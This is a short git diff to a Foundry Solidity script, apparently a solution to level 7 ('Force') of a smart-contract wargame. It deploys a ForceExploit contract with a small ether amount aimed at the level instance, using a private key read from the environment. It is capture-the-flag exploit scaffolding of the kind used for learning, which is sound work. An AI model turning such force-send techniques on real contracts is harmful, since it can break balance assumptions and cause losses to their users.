@@ -4,17 +4,18 @@
 pragma solidity ^0.8.0;
 
 import "forge-std/Script.sol";
-import {Force} from "src/07/Force.sol";
+import {ForceExploit} from "src/07/ForceExploit.sol";
+
 
 contract Exploit is Script {
 
-        address instance = vm.envAddress("INSTANCE_LEVEL7");
-        Force level = Force(instance);        
+        address payable instance = payable(vm.envAddress("INSTANCE_LEVEL7"));       
         
         function run() external {
 
             vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
+            ForceExploit exploit = new ForceExploit{value: 0.0005 ether}(instance);
             
             vm.stopBroadcast();
     }
